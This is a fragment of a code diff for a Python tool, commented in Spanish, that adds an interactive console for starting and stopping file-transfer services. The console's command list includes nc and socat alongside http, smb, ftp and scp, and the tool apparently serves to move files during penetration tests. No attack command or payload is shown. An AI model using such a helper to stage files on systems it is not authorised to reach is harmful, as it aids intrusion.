+                log.info("Deteniendo el servidor HTTP...")
+                stop_flag.set()  # Señala al servidor que debe detenerse
+                if http_server:
+                    http_server.server_close()  # Cierra el servidor HTTP
+                http_thread.join()  # Espera a que el hilo termine
+                http_thread = None
+                p1.success("HTTP server stopped")
+            else:
+                log.info("El servidor HTTP no está corriendo.")
+    
+    elif first_word == "smb" and second_word == "up":
+        start_smb_server()
+    
+    
+    else:
+        print(f"[!] Comando '{command}' no reconocido")
+
+
+
+
+
+
+
+def interactive_console():
+    print("[*] Type help")
+    while True:
+        command = input("[>] ").strip()
+        if not command:
+            continue
+        
+        # Obtener la primera palabra del comando
+        first_word = command.split()[0]
+
+        # Definir las palabras clave para cada función
+        service_commands = ['http', 'https', 'smb', 'ftp', 'ftps', 'socat', 'nc', 'scp']
+        if first_word in service_commands:
+            handle_command(command)
+        elif first_word == 'tool':
+            tool(command)
+        elif first_word == 'help':
+            help(command)
+        elif first_word == 'upload':
+            upload(command)
+        elif first_word == 'exit':
+            sys.exit(0)
+
+        else:
+            print(f"[!] Comando '{command}' no reconocido")
+
+#SERVICE = args.service
+#interface = args.interface
+#IP = get_ip(interface)
+#PORT = args.port
+#FILE = args.file
+#USERNAME = args.user
+#PASSWORD = args.password
+#CERTFILE = 'server.crt'  # Ruta al certificado
+#KEYFILE = 'server.key'   # Ruta a la clave privada
 
         
 
-
 if __name__ == "__main__":
-
-    if args.transfer:
-        print_transfer_instructions()
-        sys.exit(0)
-
-    print_transfer_instructions()
-
-    if SERVICE in ['nc', 'socat', 'scp']:
-        sys.exit(0)
-    else:
-        run_service()
+    interactive_console()
